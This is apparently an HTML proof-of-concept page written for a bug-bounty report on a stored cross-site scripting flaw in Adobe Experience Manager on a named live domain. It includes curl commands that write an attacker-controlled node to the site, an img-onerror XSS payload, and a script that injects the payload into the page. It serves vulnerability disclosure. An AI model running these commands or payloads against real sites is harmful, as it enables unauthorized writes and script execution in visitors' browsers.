<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>AEM Stored XSS — Safe Demo (Do not host on target domain)</title>
<style>
  body{font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;margin:20px;background:#f7f8fb;color:#111}
  pre{background:#fff;border:1px solid #e0e4ea;padding:12px;overflow:auto;max-height:320px}
  .box{margin-bottom:18px}
  .kbd{font-family:monospace;background:#eef;padding:2px 6px;border-radius:4px}
  .btn{display:inline-block;padding:8px 12px;border-radius:6px;border:1px solid #2b6cff;background:#2b6cff;color:#fff;text-decoration:none;cursor:pointer}
  .btn-ghost{background:#fff;color:#2b6cff;border-color:#2b6cff}
  #livePreview{min-height:80px;padding:12px;border:1px dashed #cfe2ff;background:#fff;}
  .warn{color:#a33;font-weight:600}
</style>
</head>
<body>
<h1>AEM Stored XSS — Safe Demonstration</h1>

<p>This page demonstrates how an attacker-controlled JCR node under <span class="kbd">/content/usergenerated/</span>
that stores an HTML payload could be rendered by a vulnerable AEM component. <strong>This demo runs only on this page.</strong></p>

<div class="box">
  <h2>1) Repro commands (what I ran)</h2>
  <pre>
# Create node (use --http1.1 to avoid HTTP/2/WAF quirks)
curl -i --http1.1 -X POST "https://www.myvi.in/content/usergenerated/evilnode" \
  -H "Content-Type: application/json" \
  -d '{"jcr:primaryType":"nt:unstructured","sling:resourceType":"foundation/components/text","text":"blackhat-poc"}'

# Confirm enumeration
curl -i https://www.myvi.in/content/usergenerated/evilnode.childrenlist.json
  </pre>
</div>

<div class="box">
  <h2>2) Stored node JSON (escaped)</h2>
  <p>Below is the exact JSON I stored on the target (escaped so it is safe to publish):</p>
  <pre id="storedJson">
{
  "jcr:primaryType":"nt:unstructured",
  "sling:resourceType":"foundation/components/text",
  "text":"&lt;img src=x onerror=alert('STORED-XSS-DEMO')&gt;"
}
  </pre>
  <p>Notes: the <code>text</code> property contains an HTML payload. In the target environment this property is used by the renderer — if unescaped, it would execute in visitor browsers.</p>
</div>

<div class="box">
  <h2>3) What the renderer would receive (escaped HTML)</h2>
  <p>Rendered (escaped) HTML stored in the node — shown as plain text so it doesn't run:</p>
  <pre id="escapedHtml">&lt;img src=x onerror=alert('STORED-XSS-DEMO')&gt;</pre>
</div>

<div class="box">
  <h2>4) Live safe simulation (runs only on this page)</h2>
  <p>This button will <strong>unescape</strong> the stored string and inject it into the <em>preview area below</em>. <span class="warn">Only click if you are hosting this demo on a domain you control (this demo executes a harmless alert on your domain).</span></p>
  <button id="simulateBtn" class="btn">Simulate unescaped render (safe demo)</button>
  <button id="clearBtn" class="btn btn-ghost" style="margin-left:8px">Clear preview</button>
  <div style="margin-top:12px">
    <label><strong>Preview output (this is where the vulnerable site would render unescaped HTML):</strong></label>
    <div id="livePreview" aria-live="polite"></div>
  </div>
</div>

<div class="box">
  <h2>5) How this proves the issue</h2>
  <ol>
    <li>The PoC shows an attacker-controlled node stored under <code>/content/usergenerated/</code> with a property containing HTML content.</li>
    <li>If the AEM component renders the <code>text</code> property without proper escaping/sanitization, that HTML becomes part of the page and runs in site visitors' browsers.</li>
    <li>This demo reproduces the rendering locally (on our domain) so triage teams can inspect inputs and behavior without executing anything on the target's site or affecting their users.</li>
  </ol>
</div>

<div class="box">
  <h2>6) Suggested program message (paste to vendor)</h2>
  <pre>
I have uploaded a safe public demo that reproduces how the stored 'text' property is interpreted.
Demo URL: &lt;YOUR_PUBLIC_URL_HERE&gt;

The demo shows:
 - the exact JSON stored (escaped),
 - the escaped HTML string,
 - a local simulation button that unescapes and renders the content on the demo page only.

Please review the demo; if you need a screen-recording instead I can attach that as well. I will not publish or execute payloads on your domain.
  </pre>
</div>

<hr>
<p style="font-size:0.9em;color:#333">Technical note: the simulated render uses a harmless alert <code>alert('STORED-XSS-DEMO')</code>. If you prefer a console-only demo, replace the payload above with a console-only payload (e.g. <code>&lt;img src=x onerror=console.log('demo')&gt;</code>).</p>

<script>
/* Utility: decode HTML entities (basic) */
function decodeHtmlEntities(str) {
  // use browser DOM to decode entities
  const txt = document.createElement('textarea');
  txt.innerHTML = str;
  return txt.value;
}

/* Load stored content from the pre block (so you can edit it in the file before hosting) */
const escapedHtmlNode = document.getElementById('escapedHtml');
const simulateBtn = document.getElementById('simulateBtn');
const livePreview = document.getElementById('livePreview');
const clearBtn = document.getElementById('clearBtn');

simulateBtn.addEventListener('click', function () {
  // read the escaped markup as displayed in the page
  const escaped = escapedHtmlNode.textContent || escapedHtmlNode.innerText;
  // decode entities
  const decoded = decodeHtmlEntities(escaped);
  // Inject into preview: THIS executes the content on this page only
  livePreview.innerHTML = decoded;
});

clearBtn.addEventListener('click', function () {
  livePreview.innerHTML = '';
});
</script>

</body>
</html>
